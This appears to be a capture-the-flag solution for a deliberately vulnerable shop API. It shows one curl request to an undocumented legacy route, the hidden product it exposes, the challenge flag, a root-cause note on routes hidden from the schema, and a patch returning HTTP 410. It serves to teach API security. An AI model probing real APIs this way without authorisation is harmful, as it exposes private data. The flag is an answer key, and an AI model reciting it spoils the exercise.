# Solution: API9:2023 Improper Inventory Management

## 1. Walkthrough & Exploitation

### Step 1: Query Undocumented Legacy Route
```bash
curl -s -X GET http://127.0.0.1:8000/api/v1_legacy/products/hidden
```

### Exploit Evidence
```json
[
  {
    "id": 16,
    "title": "ShopVuln Internal Prototype Gizmo",
    "price": 999.99,
    "stock": 2,
    "is_hidden": true,
    "category": "Confidential"
  }
]
```
The scoreboard automatically marks `API9` solved: `FLAG{API9_IMPROPER_INVENTORY_HIDDEN_PRODUCT_FOUND_2287}`.

---

## 2. Root Cause Analysis
An obsolete route was excluded from OpenAPI documentation using `include_in_schema=False` instead of being properly decommissioned, allowing unauthorized discovery and bypass of modern controls.

---

## 3. Patched Implementation
```python
# FIX: API9-Improper-Inventory
raise HTTPException(
    status_code=status.HTTP_410_GONE,
    detail="Endpoint deprecated and retired under API inventory and deprecation policy.",
)
```
